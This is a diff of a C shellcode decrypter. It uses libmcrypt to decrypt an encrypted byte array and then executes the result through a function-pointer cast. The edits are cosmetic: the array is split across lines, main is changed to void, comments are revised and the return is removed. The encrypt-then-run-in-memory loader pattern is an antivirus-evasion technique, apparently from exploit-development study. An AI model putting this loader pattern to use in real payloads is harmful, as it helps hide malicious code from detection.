@@ -35,15 +35,17 @@ unsigned char IV[IV_SIZE] = \
   ShellCode to decrypt
 */
 unsigned char code[]= \
-"\x33\x67\x20\x48\x7c\xcc\x09\x15\xbc\xbb\x12\x56\xfb\xe4\xfe\x74\xaf\x21\x38\x48\x48\x01\xe8\xee\x2c\x73\xa0\x1a\xe3\xba\x5c\xc4";
+"\x33\x67\x20\x48\x7c\xcc\x09\x15\xbc\xbb\x12\x56\xfb\xe4\xfe\x74"
+"\xaf\x21\x38\x48\x48\x01\xe8\xee\x2c\x73\xa0\x1a\xe3\xba\x5c\xc4";
 
-int main (void)
+void main (void)
 {
 
 	MCRYPT id_crypt;
 	int code_length = strlen(code);
 
-	printf("\nCrypted Shellcode (%d bytes):\n", code_length);
+	/* Print the Crypted Shellcode */
+	printf("\nCrypted Shellcode (%d bytes):\n", code_length);   
 	for (int i = 0; i < code_length-1; i++)
 	{
 		printf("0x%02x,", code[i]);
@@ -74,7 +76,7 @@ int main (void)
 		return MCRYPT_FAILED;
 	}
 
-	/* Encryption of the code[] string */
+	/* Decryption of the code[] string */
 	x = mdecrypt_generic(id_crypt, code, code_length);
 	if ( x < 0)		// Error Handling
 	{
@@ -101,7 +103,7 @@ int main (void)
 	}
 	printf("\\x%02x", code[code_length-1]);
 
-	/* End the mcrypt */
+	/* End mcrypt */
 	mcrypt_generic_end(id_crypt);
 
 
@@ -110,8 +112,6 @@ int main (void)
 	/* Lets run the shellcode */
 	int (*ret)() = (int(*)())code;
 	ret();
-	
-	;return(0);
 	
 }	
 
